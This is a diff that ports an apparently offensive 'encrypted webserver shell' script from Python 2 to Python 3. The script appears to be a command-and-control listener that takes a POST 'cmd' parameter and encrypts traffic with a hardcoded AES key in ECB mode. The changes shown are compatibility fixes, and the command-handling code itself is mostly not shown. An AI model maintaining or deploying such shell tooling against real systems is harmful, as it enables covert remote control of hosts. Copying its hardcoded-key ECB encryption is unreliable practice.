@@ -25,20 +25,32 @@ BLOCK_SIZE = 32
 # the character used for padding--with a block cipher such as AES, the value
 # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
 # used to ensure that your value is always a multiple of BLOCK_SIZE
-PADDING = '{'
-# one-liner to sufficiently pad the text to be encrypted
-pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+PADDING = b'{'
 
-# one-liners to encrypt/encode and decrypt/decode a string
-# encrypt with AES, encode with base64
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+
+def _to_bytes(value):
+    if isinstance(value, bytes):
+        return value
+    return str(value).encode("utf-8")
+
+
+def pad(value):
+    raw_value = _to_bytes(value)
+    return raw_value + (BLOCK_SIZE - len(raw_value) % BLOCK_SIZE) * PADDING
+
+
+def EncodeAES(cipher_obj, value):
+    return base64.b64encode(cipher_obj.encrypt(pad(value)))
+
+
+def DecodeAES(cipher_obj, value):
+    return cipher_obj.decrypt(base64.b64decode(value)).rstrip(PADDING).decode("utf-8", "replace")
 
 # 32 character secret key - change this if you want to be unique
-secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
+secret = b"(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
 
 # create a cipher object using the random secret
-cipher = AES.new(secret)
+cipher = AES.new(secret, AES.MODE_ECB)
 
 # url decode for postbacks
 
@@ -50,7 +62,7 @@ def htc(m):
 
 
 def urldecode(url):
-    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
+    rex = re.compile('%([0-9a-fA-F][0-9a-fA-F])', re.M)
     return rex.sub(htc, url)
 
 
@@ -87,9 +99,9 @@ class GetHandler(BaseHTTPRequestHandler):
         # # end headers
         self.end_headers()
         # grab the length of the POST data
-        length = int(self.headers.getheader('content-length'))
+        length = int(self.headers.get('content-length', 0))
         # read in the length of the POST data
-        qs = self.rfile.read(length)
+        qs = self.rfile.read(length).decode("utf-8", "replace")
         # url decode
         url = urldecode(qs)
         # remove the parameter cmd
@@ -128,4 +140,4 @@ try:
     except KeyboardInterrupt:
         print("[!] Exiting the encrypted webserver shell.. hack the gibson.")
 except Exception as e:
-    print("Something went wrong, printing error: " + e)
+    print("Something went wrong, printing error: " + str(e))
